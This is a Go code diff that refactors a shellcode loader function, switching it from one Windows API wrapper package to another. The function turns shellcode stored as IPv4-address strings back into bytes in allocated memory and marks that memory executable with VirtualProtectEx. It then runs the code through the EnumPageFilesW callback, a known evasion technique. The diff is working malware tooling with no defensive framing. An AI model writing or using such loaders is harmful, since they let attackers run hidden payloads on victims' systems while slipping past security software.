@@ -3,35 +3,48 @@ package loader
 import (
 	"unsafe"
 	"variant/log"
-	"variant/wdll"
+	"variant/xwindows"
 
 	"golang.org/x/sys/windows"
 )
 
 func Ipv4AddressA(shellcode []string) {
-	addr, _, err := wdll.AllocADsMem().Call(uintptr(len(shellcode) * 4))
-	if addr == 0 || err.Error() != "The operation completed successfully." {
-		log.Fatalf("AllocADsMem() err: %v", err)
+	addr, adErr := xwindows.AllocADsMem(uintptr(len(shellcode) * 4))
+	if addr == 0 {
+		log.Fatalf("AllocADsMem failed: %v", adErr)
 	}
 
 	addrPtr := addr
 	for _, ipv4 := range shellcode {
 		u := append([]byte(ipv4), 0)
 
-		_, _, err = wdll.RtlIpv4StringToAddressA().Call(uintptr(unsafe.Pointer(&u[0])), uintptr(0), uintptr(unsafe.Pointer(&u[0])), addrPtr)
+		_, err := xwindows.RtlIpv4StringToAddressA(
+			uintptr(unsafe.Pointer(&u[0])),
+			uintptr(0),
+			uintptr(unsafe.Pointer(&u[0])),
+			addrPtr,
+		)
 		if err != nil && err.Error() != "The operation completed successfully." {
-			log.Fatalf("RtlIpv4StringToAddressA() err: %v", err)
+			log.Fatalf("RtlIpv4StringToAddressA failed: %v", err)
 		}
 
 		addrPtr += 4
 	}
 
 	oldProtect := windows.PAGE_READWRITE
-	wdll.VirtualProtectEx().Call(
-		uintptr(windows.CurrentProcess()),
-		addr, uintptr(len(shellcode)*4),
+	vpErr := xwindows.VirtualProtectEx(
+		windows.CurrentProcess(),
+		addr,
+		uintptr(len(shellcode)*4),
 		windows.PAGE_EXECUTE_READWRITE,
-		uintptr(unsafe.Pointer(&oldProtect)))
+		(*uint32)(unsafe.Pointer(&oldProtect)),
+	)
+	if vpErr != nil {
+		log.Fatalf("AlloVirtualProtectEx failed: %v", vpErr)
+	}
 
-	wdll.EnumPageFilesW().Call(addr, 0)
+	_, pfErr := xwindows.EnumPageFilesW(addr, 0)
+	if pfErr != nil {
+		log.Fatalf("EnumPageFilesW failed: %v", pfErr)
+	}
 }
